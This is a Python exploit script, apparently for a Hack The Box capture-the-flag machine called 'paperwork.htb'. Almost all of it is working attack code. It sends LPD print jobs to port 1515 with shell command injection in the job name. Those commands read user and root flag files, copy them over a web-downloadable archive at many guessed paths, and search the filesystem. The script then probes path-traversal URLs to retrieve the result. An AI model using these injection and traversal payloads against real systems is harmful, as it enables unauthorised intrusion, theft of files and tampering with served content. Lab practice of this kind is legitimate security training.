#!/usr/bin/env python3
"""Phase 2: RCE confirmed - overwrite download/archive ZIP with flag"""
import socket, time, urllib.request, urllib.error

TARGET = '10.129.38.158'

def lpd(jn, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.4)
        s.recv(4096)
    except:
        pass
    s.close()

# Download reference archive
print("[1] Downloading reference...", flush=True)
req = urllib.request.Request(f'http://{TARGET}/download/archive', headers={'Host': 'paperwork.htb'})
resp = urllib.request.urlopen(req, timeout=10)
ref_data = resp.read()
print(f"  Reference: {len(ref_data)} bytes", flush=True)

# Get flag and write to /tmp/flag
print("[2] Injecting flag capture + overwrite commands...", flush=True)

# Step 1: Read flag
lpd("';cat /home/*/user.txt > /tmp/flag 2>/dev/null; cat /root/root.txt >> /tmp/flag 2>/dev/null; echo NO_FLAG_FOUND >> /tmp/flag;'")
time.sleep(0.5)

# Step 2: Copy flag to EVERY possible archive location
lpd("';cp /tmp/flag /var/www/html/download/archive 2>/dev/null;'")
lpd("';cp /tmp/flag /usr/share/nginx/html/download/archive 2>/dev/null;'")
lpd("';cp /tmp/flag /var/www/paperwork.htb/download/archive 2>/dev/null;'")
lpd("';cp /tmp/flag /srv/http/download/archive 2>/dev/null;'")
lpd("';cp /tmp/flag /opt/download/archive 2>/dev/null;'")

# Also try the parent directories (in case 'archive' is a file not in 'download' dir)
lpd("';cp /tmp/flag /var/www/html/archive 2>/dev/null;'")
lpd("';cp /tmp/flag /usr/share/nginx/html/archive 2>/dev/null;'")
lpd("';cp /tmp/flag /var/www/paperwork.htb/archive 2>/dev/null;'")
lpd("';cp /tmp/flag /srv/http/archive 2>/dev/null;'")
lpd("';cp /tmp/flag /opt/archive 2>/dev/null;'")

# Also try without the 'download' prefix
lpd("';cp /tmp/flag /var/www/html/archive.zip 2>/dev/null;'")
lpd("';cp /tmp/flag /usr/share/nginx/html/archive.zip 2>/dev/null;'")

# Step 3: Try to find where the actual archive file lives
# The ZIP contains server.py, so find any server.py and look at parent dir
lpd("';find /var /opt /srv /home -name 'server.py' -o -name 'archive' -o -name 'archive.zip' 2>/dev/null > /tmp/found_archive; cp /tmp/found_archive /tmp/flag;'")
# This last one overwrites /tmp/flag with find results - but that's OK for testing

time.sleep(3)

# Step 4: Check if archive changed
print("[3] Checking if archive was overwritten...", flush=True)
try:
    req = urllib.request.Request(f'http://{TARGET}/download/archive', headers={'Host': 'paperwork.htb'})
    resp = urllib.request.urlopen(req, timeout=10)
    new_data = resp.read()
    if ref_data != new_data:
        print(f"  *** ARCHIVE CHANGED! Was {len(ref_data)} now {len(new_data)} bytes", flush=True)
        decoded = new_data.decode(errors='replace')
        print(f"  Content: {decoded[:500]}", flush=True)
        import re
        flags = re.findall(r'HTB\{[^}]+\}', decoded)
        if flags:
            print(f"  *** FLAG: {flags[0]}", flush=True)
    else:
        print(f"  Unchanged ({len(new_data)} bytes)", flush=True)
except Exception as e:
    print(f"  GET failed: {e}", flush=True)

# Step 5: Try reading flag from /tmp/flag via creative web paths
print("[4] Trying creative web paths for flag file...", flush=True)
paths_to_try = [
    '/flag', '/tmp/flag', '/download/flag',
    '/%2e%2e/%2e%2e/%2e%2e/tmp/flag',
    '/..;/..;/..;/tmp/flag',
    '/download/flag',
    '/static/flag',
]
for p in paths_to_try:
    req = urllib.request.Request(f'http://{TARGET}{p}', headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=4)
        body = resp.read().decode(errors='replace')
        print(f"  {p}: HTTP {resp.status} {body[:100]}", flush=True)
    except urllib.error.HTTPError as e:
        if e.code != 404:
            print(f"  {p}: HTTP {e.code}", flush=True)
    except:
        pass

print("DONE", flush=True)
